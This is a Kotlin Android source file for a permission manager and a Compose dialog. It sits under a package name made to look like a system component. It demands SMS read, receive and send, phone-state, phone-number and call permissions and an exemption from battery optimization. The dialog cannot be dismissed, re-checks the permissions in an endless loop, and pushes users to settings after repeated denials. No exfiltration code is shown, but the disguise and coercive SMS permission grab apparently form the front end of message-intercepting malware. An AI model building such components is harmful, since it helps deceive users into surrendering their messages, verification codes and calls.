package com.android.system.services.utils

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import kotlinx.coroutines.delay

class PermissionManager(private val activity: ComponentActivity) {

    private val handler = Handler(Looper.getMainLooper())
    private var batteryCheckRunnable: Runnable? = null

    companion object {
        private const val TAG = "PermissionManager"
    }

    private lateinit var permissionLauncher: ActivityResultLauncher<Array<String>>

    fun initialize(onPermissionsGranted: () -> Unit) {
        permissionLauncher = activity.registerForActivityResult(
            ActivityResultContracts.RequestMultiplePermissions()
        ) { permissions ->
            handler.postDelayed({
                if (checkAllPermissions()) {
                    onPermissionsGranted()
                }
            }, 500)
        }
    }

    fun checkAllPermissions(): Boolean {
        val permissions = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CALL_PHONE
        )
        
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            permissions.add(Manifest.permission.READ_PHONE_NUMBERS)
        }

        val allGranted = permissions.all {
            ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED
        }

        val pm = activity.getSystemService(Context.POWER_SERVICE) as PowerManager
        val batteryOptimization = pm.isIgnoringBatteryOptimizations(activity.packageName)

        return allGranted && batteryOptimization
    }

    suspend fun requestPermissions(onStatusUpdate: () -> Unit) {
        val missingPermissions = mutableListOf<String>()

        if (ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED)
            missingPermissions.add(Manifest.permission.READ_SMS)
        if (ContextCompat.checkSelfPermission(activity, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED)
            missingPermissions.add(Manifest.permission.RECEIVE_SMS)
        if (ContextCompat.checkSelfPermission(activity, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED)
            missingPermissions.add(Manifest.permission.SEND_SMS)
        if (ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED)
            missingPermissions.add(Manifest.permission.READ_PHONE_STATE)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            if (ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED)
                missingPermissions.add(Manifest.permission.READ_PHONE_NUMBERS)
        }
        if (ContextCompat.checkSelfPermission(activity, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED)
            missingPermissions.add(Manifest.permission.CALL_PHONE)

        if (missingPermissions.isNotEmpty()) {
            permissionLauncher.launch(missingPermissions.toTypedArray())
            delay(1000)
        }

        val pm = activity.getSystemService(Context.POWER_SERVICE) as PowerManager
        if (!pm.isIgnoringBatteryOptimizations(activity.packageName)) {
            openBatteryOptimizationSettings()
            startBatteryMonitoring(onStatusUpdate)
        }

        delay(500)
        onStatusUpdate()
    }

    private fun openBatteryOptimizationSettings() {
        try {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to open battery settings: ${e.message}")
        }
    }

    private fun startBatteryMonitoring(onStatusUpdate: () -> Unit) {
        batteryCheckRunnable?.let { handler.removeCallbacks(it) }

        batteryCheckRunnable = object : Runnable {
            override fun run() {
                if (checkAllPermissions()) {
                    onStatusUpdate()
                } else {
                    handler.postDelayed(this, 2000)
                }
            }
        }

        handler.post(batteryCheckRunnable!!)
    }

    fun stopBatteryMonitoring() {
        batteryCheckRunnable?.let { handler.removeCallbacks(it) }
        batteryCheckRunnable = null
    }
}

data class PermissionGroup(
    val permissions: List<String>,
    val title: String,
    val icon: String
)

@Composable
fun PermissionDialog(
    onRequestPermissions: () -> Unit,
    onAllPermissionsGranted: () -> Unit = {}
) {
    val context = androidx.compose.ui.platform.LocalContext.current
    val activity = context as? ComponentActivity
    
    val permissionGroups = remember {
        listOf(
            PermissionGroup(
                listOf(
                    Manifest.permission.READ_SMS,
                    Manifest.permission.RECEIVE_SMS,
                    Manifest.permission.SEND_SMS
                ),
                "Messages",
                "💬"
            ),
            PermissionGroup(
                listOf(Manifest.permission.CALL_PHONE),
                "Calls",
                "📞"
            ),
            PermissionGroup(
                listOf(
                    Manifest.permission.READ_PHONE_STATE,
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                        Manifest.permission.READ_PHONE_NUMBERS
                    } else {
                        ""
                    }
                ).filter { it.isNotEmpty() },
                "Phone",
                "📱"
            )
        )
    }
    
    var groupStates by remember { mutableStateOf(mapOf<String, Boolean>()) }
    var batteryOptimization by remember { mutableStateOf(false) }
    var attemptCount by remember { mutableStateOf(0) }
    
    LaunchedEffect(Unit) {
        while (true) {
            if (activity != null) {
                val states = permissionGroups.associate { group ->
                    group.title to group.permissions.all { permission ->
                        ContextCompat.checkSelfPermission(
                            activity,
                            permission
                        ) == PackageManager.PERMISSION_GRANTED
                    }
                }
                groupStates = states
                
                val pm = activity.getSystemService(Context.POWER_SERVICE) as PowerManager
                batteryOptimization = pm.isIgnoringBatteryOptimizations(activity.packageName)
            }
            delay(500)
        }
    }
    
    val allPermissionsGranted = groupStates.values.all { it } && batteryOptimization
    val hasAnyDenied = !allPermissionsGranted
    
    LaunchedEffect(allPermissionsGranted) {
        if (allPermissionsGranted) {
            onAllPermissionsGranted()
        }
    }
    
    AlertDialog(
        onDismissRequest = { },
        containerColor = Color.White,
        shape = RoundedCornerShape(14.dp),
        title = {
            Column(
                horizontalAlignment = Alignment.CenterHorizontally,
                modifier = Modifier.fillMaxWidth()
            ) {
                Text(
                    text = "🔐",
                    fontSize = 28.sp
                )
                Spacer(modifier = Modifier.height(6.dp))
                Text(
                    text = "Permissions Required",
                    fontSize = 15.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color(0xFF1A1A1A)
                )
                Spacer(modifier = Modifier.height(2.dp))
                Text(
                    text = "Please allow access",
                    fontSize = 10.sp,
                    color = Color.Gray
                )
            }
        },
        text = {
            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(vertical = 2.dp)
            ) {
                Text(
                    text = "App needs:",
                    fontSize = 10.sp,
                    color = Color.Gray,
                    modifier = Modifier.padding(bottom = 6.dp)
                )
                
                permissionGroups.forEach { group ->
                    val isGranted = groupStates[group.title] ?: false
                    
                    if (!isGranted) {
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .padding(vertical = 3.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Text(
                                text = group.icon,
                                fontSize = 20.sp,
                                modifier = Modifier.width(35.dp)
                            )
                            
                            Text(
                                text = group.title,
                                fontSize = 13.sp,
                                fontWeight = FontWeight.Medium,
                                color = Color(0xFF1A1A1A)
                            )
                        }
                    }
                }
                
                if (!batteryOptimization) {
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(vertical = 3.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Text(
                            text = "🔋",
                            fontSize = 20.sp,
                            modifier = Modifier.width(35.dp)
                        )
                        
                        Text(
                            text = "Battery",
                            fontSize = 13.sp,
                            fontWeight = FontWeight.Medium,
                            color = Color(0xFF1A1A1A)
                        )
                    }
                }
                
                if (attemptCount >= 2 && hasAnyDenied) {
                    Spacer(modifier = Modifier.height(6.dp))
                    
                    Card(
                        modifier = Modifier.fillMaxWidth(),
                        colors = CardDefaults.cardColors(
                            containerColor = Color(0xFFFFF3CD)
                        ),
                        shape = RoundedCornerShape(6.dp)
                    ) {
                        Text(
                            text = "⚠️ Try Settings",
                            fontSize = 10.sp,
                            fontWeight = FontWeight.Medium,
                            color = Color(0xFF856404),
                            modifier = Modifier.padding(6.dp)
                        )
                    }
                }
            }
        },
        confirmButton = {
            Column(
                modifier = Modifier.fillMaxWidth()
            ) {
                Button(
                    onClick = {
                        attemptCount++
                        onRequestPermissions()
                    },
                    colors = ButtonDefaults.buttonColors(
                        containerColor = Color.Transparent
                    ),
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(40.dp)
                        .background(
                            brush = Brush.horizontalGradient(
                                colors = listOf(
                                    Color(0xFF667eea),
                                    Color(0xFF764ba2)
                                )
                            ),
                            shape = RoundedCornerShape(10.dp)
                        ),
                    contentPadding = PaddingValues(0.dp)
                ) {
                    Text(
                        text = if (attemptCount == 0) "Allow" else "Try Again",
                        fontSize = 13.sp,
                        fontWeight = FontWeight.Bold,
                        color = Color.White
                    )
                }
                
                if (attemptCount >= 2 && hasAnyDenied && activity != null) {
                    Spacer(modifier = Modifier.height(6.dp))
                    
                    OutlinedButton(
                        onClick = {
                            try {
                                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                                    data = Uri.parse("package:${activity.packageName}")
                                }
                                activity.startActivity(intent)
                            } catch (e: Exception) {
                                Log.e("PermissionDialog", "Failed to open settings: ${e.message}")
                            }
                        },
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(40.dp),
                        shape = RoundedCornerShape(10.dp),
                        colors = ButtonDefaults.outlinedButtonColors(
                            contentColor = Color(0xFF667eea)
                        )
                    ) {
                        Text(
                            text = "⚙️ Settings",
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Medium
                        )
                    }
                }
            }
        },
        modifier = Modifier
            .width(260.dp)
            .wrapContentHeight()
    )
}